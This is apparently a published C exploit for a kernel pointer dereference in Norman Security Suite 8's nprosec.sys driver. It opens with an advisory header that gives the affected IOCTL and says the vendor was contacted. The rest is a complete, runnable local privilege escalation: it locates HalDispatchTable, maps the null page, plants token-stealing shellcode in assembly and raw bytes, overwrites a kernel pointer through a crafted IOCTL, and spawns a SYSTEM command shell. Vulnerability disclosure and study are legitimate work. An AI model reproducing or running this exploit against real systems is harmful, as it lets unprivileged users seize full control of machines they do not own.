#include <stdio.h>
#include <windows.h>
#include <winioctl.h>
#include <tchar.h>

/*

Discovered by  : Xst3nZ (Jérémy Brun-Nouvion)


----[ Software ]-------------------------------------------------------------------------

Program        : Norman Security Suite 8
Official page  : http://www.norman.com/products/security_suite/en
Description    : "This easy-to-use software will protect you from inappropriate content, 
                  rootkits and other hostile activity, whether you are using online 
                  banking, chatting, emailing, playing games or just surfing the net."
		  This suite contains: Intrusion Guards, Privacy Tools, 
	          Norman Scanner Engine, Personal Firewall, Antivirus
Certified by   : OPSWAT


----[ Vulnerability ]--------------------------------------------------------------------

Discovery        : 2011-09-26
Description      : The driver "nprosec.sys" is vulnerable to a kernel pointer dereferencement.
                   This vulnerability allows an attacker with a local access to the machine 
		   to escalate his privilege, that is to say to gain SYSTEM privileges from 
		   a limited account.
Affected IOCTL   : 0x00220210

Status           : 0day
Vendor contacted : 2011-09-28


----[ Contact ]--------------------------------------------------------------------------

Mail           : xst3nz (at) gmail (dot) com
Twitter        : @Xst3nZ
Personal Blog  : http://poppopret.blogspot.com


----[ Exploitation PoC ]-----------------------------------------------------------------

Tested on      : Windows XP SP3 (offsets may be changed for other versions)
Demo           :

[~] Open an handle to the driver \\.\nprosec ...
[+] Handle: 000007E8
[~] Retrieve Kernel address of HalDispatchTable ...
[+] HalDispatchTable+4 (0x8054593c) will be overwritten
[~] Map executable memory 0x00000000 - 0x0000FFFF ...
[~] Put the Shellcode to steal System process Token @ 0x00005000
[~] Update Shellcode with PID of the current process ...
[+] Shellcode updated with PID = 3604

[~] Ready ? Press any key to send IOCTL (0x00220210) with payload...
[+] IOCTL sent !
[~] Launch the shellcode ...
[+] Okay... System Token should be stolen, let's spawn a SYSTEM shell :)


----[ GreetZ ]---------------------------------------------------------------------------

Heurs

*/


typedef struct {
    PVOID   Unknown1;
    PVOID   Unknown2;
    PVOID   Base;
    ULONG   Size;
    ULONG   Flags;
    USHORT  Index;
    USHORT  NameLength;
    USHORT  LoadCount;
    USHORT  PathLength;
    CHAR    ImageName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;
 
typedef struct {
    ULONG   Count;
    SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS { 
  SystemModuleInformation = 11,
  SystemHandleInformation = 16
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS (WINAPI *_NtQuerySystemInformation)(
   SYSTEM_INFORMATION_CLASS SystemInformationClass,
   PVOID SystemInformation,
   ULONG SystemInformationLength,
   PULONG ReturnLength
);
typedef NTSTATUS (__stdcall *_NtQueryIntervalProfile)(DWORD ProfileSource, PULONG Interval);
typedef NTSTATUS (__stdcall *_NtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID *BaseAddress,
													   ULONG_PTR ZeroBits, PSIZE_T RegionSize,
													   ULONG AllocationType, ULONG Protect);


ULONG_PTR HalDispatchTable;
SYSTEM_INFO GlobalInfo;


// Retrieve the real kernel address of a given symbol -----------------------------------
FARPROC GetKernAddress(HMODULE UserKernBase, PVOID RealKernelBase, LPCSTR SymName) {
	PUCHAR KernBaseTemp 	= (PUCHAR)UserKernBase;
	PUCHAR RealKernBaseTemp = (PUCHAR)RealKernelBase;
	PUCHAR temp = (PUCHAR)GetProcAddress(UserKernBase, SymName);
	if(temp == NULL)
		return NULL;
		
	return (FARPROC)(temp - KernBaseTemp + RealKernBaseTemp);
}

// Retrieve kernel address of HalDispatchTable ------------------------------------------
BOOL LoadAndGetKernelBase() {
	CHAR kFullName[256];
	PVOID kBase=NULL;
	LPSTR kName;
	HMODULE NTosHandle;
	_NtQuerySystemInformation NtQuerySystemInformation;
	PSYSTEM_MODULE_INFORMATION pModuleInfo;
	ULONG len;
	NTSTATUS ret;
	HMODULE ntdllHandle;

	ntdllHandle = GetModuleHandle((LPCTSTR)"ntdll");
	if(!ntdllHandle) {
		return FALSE;
	}

	NtQuerySystemInformation =  (_NtQuerySystemInformation)GetProcAddress(ntdllHandle, 
	                            "NtQuerySystemInformation");
	if(!NtQuerySystemInformation) {
		return FALSE;
	}
		
	ret = NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	if(!ret) {
		return FALSE;
	}
		
	pModuleInfo = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
	ret = NtQuerySystemInformation(SystemModuleInformation, pModuleInfo, len, &len);
	
	
	memset(kFullName, 0x00, sizeof(kFullName));
	strcpy_s(kFullName, sizeof(kFullName)-1, pModuleInfo->Module[0].ImageName);
	kBase = pModuleInfo->Module[0].Base;

	kName = strrchr(kFullName, '\\');
	NTosHandle = LoadLibraryA(++kName);

	if(NTosHandle == NULL) {
		return FALSE;
	}
	
	HalDispatchTable = (ULONG_PTR)GetKernAddress(NTosHandle, kBase, "HalDispatchTable");
	if(!HalDispatchTable)
		return FALSE;

	return TRUE;
}

// Create a child process ---------------------------------------------------------------
BOOL CreateChild(PWCHAR Child) {

    PROCESS_INFORMATION pi;
	  STARTUPINFO si;

    ZeroMemory( &si, sizeof(si) );
    si.cb = sizeof(si);
    ZeroMemory( &pi, sizeof(pi) );

    if (!CreateProcess(Child, Child, NULL, NULL, 0, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
        return FALSE;

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return TRUE;
}


// Shellcode used to steal the Access Token of the System process (PID=4) ---------------
/*

shellcode:

; ----------------------------------------------------------------------
;                  Shellcode for Windows XP SP3
; ----------------------------------------------------------------------

; Offsets
WINXP_KTHREAD_OFFSET   equ 124h    ; nt!_KPCR.PcrbData.CurrentThread
WINXP_EPROCESS_OFFSET  equ 044h    ; nt!_KTHREAD.ApcState.Process
WINXP_FLINK_OFFSET     equ 088h    ; nt!_EPROCESS.ActiveProcessLinks.Flink
WINXP_PID_OFFSET       equ 084h    ; nt!_EPROCESS.UniqueProcessId
WINXP_TOKEN_OFFSET     equ 0c8h    ; nt!_EPROCESS.Token
WINXP_SYS_PID          equ 04h     ; PID Process SYSTEM


pushad                                ; save registers

mov eax, fs:[WINXP_KTHREAD_OFFSET]   ; EAX <- current _KTHREAD
mov eax, [eax+WINXP_EPROCESS_OFFSET] ; EAX <- current _KPROCESS == _EPROCESS
push eax


mov ebx, WINXP_SYS_PID

SearchProcessPidSystem:

mov eax, [eax+WINXP_FLINK_OFFSET]     ; EAX <- _EPROCESS.ActiveProcessLinks.Flink
sub eax, WINXP_FLINK_OFFSET           ; EAX <- _EPROCESS of the next process
cmp [eax+WINXP_PID_OFFSET], ebx       ; UniqueProcessId == SYSTEM PID ?
jne SearchProcessPidSystem            ; if no, retry with the next process...

mov edi, [eax+WINXP_TOKEN_OFFSET]     ; EDI <- Token of process with SYSTEM PID
and edi, 0fffffff8h                   ; Must be aligned by 8

pop eax                               ; EAX <- current _EPROCESS 


mov ebx, 41414141h

SearchProcessPidToEscalate:

mov eax, [eax+WINXP_FLINK_OFFSET]     ; EAX <- _EPROCESS.ActiveProcessLinks.Flink
sub eax, WINXP_FLINK_OFFSET           ; EAX <- _EPROCESS of the next process
cmp [eax+WINXP_PID_OFFSET], ebx       ; UniqueProcessId == PID of the process 
                                      ; to escalate ?
jne SearchProcessPidToEscalate        ; if no, retry with the next process...

SwapTokens:

mov [eax+WINXP_TOKEN_OFFSET], edi     ; We replace the token of the process 
                                      ; to escalate by the token of the process
                                      ; with SYSTEM PID

PartyIsOver:

popad                                 ; restore registers
ret

end shellcode
*/

char ShellcodeSwapTokens[] = "\x60\x64\xA1\x24\x01\x00\x00\x8B\x40\x44\x50\xBB\x04\x00\x00\x00"
"\x8B\x80\x88\x00\x00\x00\x2D\x88\x00\x00\x00\x39\x98\x84\x00\x00"
"\x00\x75\xED\x8B\xB8\xC8\x00\x00\x00\x83\xE7\xF8\x58\xBB\x41\x41"
"\x41\x41\x8B\x80\x88\x00\x00\x00\x2D\x88\x00\x00\x00\x39\x98\x84"
"\x00\x00\x00\x75\xED\x89\xB8\xC8\x00\x00\x00\x61\xC3";

PUCHAR mapShellcodeSwapTokens = 0x00005000;


// Function used to update the exploit's PID in the shellcode ---------------------------
BOOL MajShellcodePid(){
     DWORD ProcessID;
     DWORD MagicWord = 0x41414141;
     int i;
     
	 ProcessID = (DWORD)GetCurrentProcessId();
     for (i=0; i<sizeof(ShellcodeSwapTokens); i++) {
         if (!memcmp(mapShellcodeSwapTokens+i, &MagicWord, 4)) {
            mapShellcodeSwapTokens[i]   = (DWORD)  ProcessID & 0x000000FF;
            mapShellcodeSwapTokens[i+1] = ((DWORD) ProcessID & 0x0000FF00) >> 8;
            mapShellcodeSwapTokens[i+2] = ((DWORD) ProcessID & 0x00FF0000) >> 16;
            mapShellcodeSwapTokens[i+3] = ((DWORD) ProcessID & 0xFF000000) >> 24;
            return TRUE;
         }
     }
     return FALSE;
}


// Exploit Main function ----------------------------------------------------------------
int main(int argc, char *argv[]) {
	
	HANDLE hDevice;

	DWORD input[] = { 0xffff0000, 0x00000008 };
	DWORD output[0x8];

	ULONG dummy = 0;
	PCHAR addr  = (PCHAR)1;
	ULONG size  = 0xffff;
	NTSTATUS status;

	ULONG_PTR HalDispatchTableTarget;
	_NtQueryIntervalProfile  NtQueryIntervalProfile;
	_NtAllocateVirtualMemory NtAllocateVirtualMemory;


	NtQueryIntervalProfile  = (_NtQueryIntervalProfile)GetProcAddress(GetModuleHandle((LPCSTR)"ntdll.dll"), 
				  "NtQueryIntervalProfile");
	NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandle("ntdll.dll"), 
		                  "NtAllocateVirtualMemory");

							  
	printf("------------------------------------------------------------------\n");
	printf("     Norman Security Suite 8 (nprosec.sys - IOCTL 0x00220210)     \n");
	printf("   Local Privilege Escalation using Kernel pointer dereference    \n");
	printf("            Proof of Concept tested on Win XP SP3                 \n");
	printf("------------------------------------------------------------------\n\n");

	printf("[~] Open an handle to the driver \\\\.\\nprosec ...\n");
	hDevice = CreateFile("\\\\.\\nprosec", 
						GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);

	if(hDevice == (HANDLE)0xFFFFFFFF) {
		printf("[!] Cannot open a handle to the driver, it is probably not loaded. ");
		printf("Error : %d\n", GetLastError());
		exit(1);
	}
	
	printf("[+] Handle: %p\n",hDevice);


	printf("[~] Retrieve Kernel address of HalDispatchTable ...\n");	
	if(LoadAndGetKernelBase() == FALSE) {
		printf("[!] An error occured ! Impossible to retrieve the address.\n");
		exit(1);
	}
	HalDispatchTableTarget = HalDispatchTable + sizeof(ULONG_PTR);
	printf("[+] HalDispatchTable+4 (0x%08x) will be overwritten\n", (DWORD)HalDispatchTableTarget);
	input[0] = (DWORD)HalDispatchTableTarget;


	printf("[~] Map executable memory 0x00000000 - 0x0000FFFF ...\n");
    	status = NtAllocateVirtualMemory((HANDLE)0xffffffff, (PVOID *) &addr, 0, &size,
                                          MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if(status) {
		printf("[!] An error occured while mapping executable memory. Status = 0x%08x\n", status);
		exit(1);
	}
	
	
	printf("[~] Put the Shellcode to steal System process Token @ 0x%08x\n", (DWORD)mapShellcodeSwapTokens);
	memset(1, '\x90', 0xffff);
	RtlCopyMemory(0x00005000, ShellcodeSwapTokens, sizeof(ShellcodeSwapTokens));

	printf("[~] Update Shellcode with PID of the current process ...\n");
	if(!MajShellcodePid()) {
		printf("[!] An error occured\n");
		exit(1);
	}
	printf("[+] Shellcode updated with PID = %d\n\n", (DWORD)GetCurrentProcessId());
	

	printf("[~] Ready ? Press any key to send IOCTL (0x00220210) with payload...\n");
	getch();
	DeviceIoControl(hDevice, 0x00220210, &input, 0x8, &output, 0x8, NULL, NULL);
	printf("[+] IOCTL sent !\n");
	
	printf("[~] Launch the shellcode ...\n");
	NtQueryIntervalProfile(2, &dummy);
	printf("[+] Okay... System Token should be stolen, let's spawn a SYSTEM shell :)\n");
	
	if (CreateChild(_T("C:\\WINDOWS\\SYSTEM32\\CMD.EXE")) != TRUE) {
		printf("[!] Unable to spawn process. Error: %d\n", GetLastError());
		exit(1);
	}
	
    	CloseHandle(hDevice);
	getch();

    	return 0;	
}
